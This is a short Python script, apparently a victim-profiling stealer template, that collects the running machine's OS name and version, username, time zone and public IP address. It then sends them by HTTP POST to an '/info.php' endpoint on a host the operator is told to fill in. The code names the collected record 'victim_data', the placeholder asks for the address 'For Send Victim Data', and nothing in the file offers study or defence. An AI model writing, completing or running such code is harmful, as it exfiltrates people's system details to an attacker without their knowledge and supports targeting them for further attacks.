
import platform
import getpass
import time
import requests
import os

# created by Ali Garivani
os.system('cls')
print('now started ... ')
time.sleep(1)
os_name = platform.uname()[0]
os_version = platform.uname()[2]
user_name = getpass.getuser()
time_zone = time.tzname[0]
os.system('cls')
print('config ip ...')
time.sleep(1)
ip = requests.get('https://api.ipify.org/').text

victim_data = {
    'OsName': os_name, 'TimeZone': time_zone, 'Ip': ip, 'OsVersion': os_version, "UserName": user_name
}
# change here :
address = ' /<>/<>/<>/ Enter Your Address Host For Send Victim Data /<>/<>/<>/ '
http = requests.post(f'{address}/info.php', data=victim_data)
os.system('cls')

print('well done :) ')
